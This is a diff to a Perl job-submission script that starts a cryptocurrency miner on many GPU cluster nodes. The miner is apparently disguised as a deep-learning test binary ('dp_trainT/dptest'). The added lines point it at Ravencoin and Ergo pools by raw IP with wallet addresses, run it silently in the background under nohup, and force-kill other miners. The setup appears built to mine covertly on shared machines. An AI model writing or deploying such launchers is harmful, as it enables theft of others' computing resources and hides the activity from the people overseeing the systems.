@@ -18,6 +18,16 @@ encrypted 3443
   -o stratum+tcp://rvn.2miners.com:6060 -u RNm4LMBGyfH8ddCGvncQKrMtxEydxwhUJL.rig -p x
 /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://18.167.166.214:3333 \
         -u RRQLCfknZ3xRDyM4wafwMxBexwzumG1c1s -p x -w node42-182 
+erg:(kucoin wallet 9gt7gvUrrVpkhzQ8EW8RAkQrt4u7Dpix1T1h25nZJqhvTxFCjJw )
+9gt7gvUrrVpkhzQ8EW8RAkQrt4u7Dpix1T1h25nZJqhvTxFCjJw
+erg:
+https://ergo.flypool.org/start
+1.stratum-ergo.flypool.org
+
+port 
+3333 + 1
+alternative 13333 +1
+encrypted 3443 +1
 =cut
 use warnings;
 use strict;
@@ -31,17 +41,17 @@ my $miner = "lolminer";# or lolminer
 ###main jobs to do
 #my $killjobs = "yes";
 my $sumitjobs = "yes";
-my $killjobs = "yes";
+my $killjobs = "no";
 #my $sumitjobs = "no";
 my $checkstatus = "yes";
 
 my %nodes = (
-    161 => [0],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
+    #161 => [0],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
     #161 => [8..18],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
     #161 => [10],#[1,3,39..42],#1,3,39.., bad node 18
-    #161 => [1,3,8..18,20..21,39..42],#[1,3,39..42],#1,3,39..    
+    161 => [1,3,8..18,20..21,39..42],#[1,3,39..42],#1,3,39..    
     #161 => [17],#[1,3,39..42],#1,3,39..    
-    182 => [20..24]
+    182 => [6..7,20..24]
     );
 #get current for the corresponding setting    
 my $ip = `/usr/sbin/ip a`;    
@@ -92,8 +102,15 @@ $pm->start and next;
     #$mining_cmd ="nohup ~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster --dualmode TONDUAL --dualpool https://pool.services.tonwhales.com --dualuser EQBhjbH5YjuNqskpDdDNib_M4ujBj8SM0UeqEmMtUkRGJTYS --worker $nodename-$cluster 2>&1 >/dev/null &";
     
     #$mining_cmd ="nohup ~/dp_train/dptest --algo ETHASH --pool 18.167.166.214:4444 --user 0x7D599D3920Fa565957ea81796c05b3f3450531FE\.$nodename-$cluster 2>&1 >/dev/null &";
-	$mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://18.167.166.214:3333 \\
-        -u RRQLCfknZ3xRDyM4wafwMxBexwzumG1c1s -p x -w $nodename-$cluster 2>&1 >/dev/null &";
+	#Ergo
+    #$mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a autolykos2 -o stratum+tcp://18.167.166.214:3334 \\
+    #    -u 9gt7gvUrrVpkhzQ8EW8RAkQrt4u7Dpix1T1h25nZJqhvTxFCjJw\.$nodename-$cluster -p x 2>&1 >/dev/null &";
+    #RVN
+   $mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://54.238.145.148:3333 \\
+       -u RRQLCfknZ3xRDyM4wafwMxBexwzumG1c1s\.$cluster-$nodename -p x 2>&1 >/dev/null &";
+    
+    #$mining_cmd = "nohup /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://18.167.166.214:3333 \\
+    #    -u RRQLCfknZ3xRDyM4wafwMxBexwzumG1c1s\.$nodename-$cluster -p x 2>&1 >/dev/null &";
     # /home/jsp/dp_trainT/dptest -a kawpow -o stratum+tcp://18.167.166.214:3333 \
     #    -u RRQLCfknZ3xRDyM4wafwMxBexwzumG1c1s -p x -w node42-182 
      
@@ -119,7 +136,7 @@ $pm->start and next;
         `echo "Dup: job No. in $nodename: $gpujob" >> dupJobs.dat`;
         if($temp){
             print "killing job\n";
-            `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"t-rex|miner|dptest\\\"|awk '{print \\\$2}'|xargs kill"`;
+            `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"t-rex|miner|dptest\\\"|awk '{print \\\$2}'|xargs kill -9"`;
         }
         else{
              print "No existing job currently!\n";
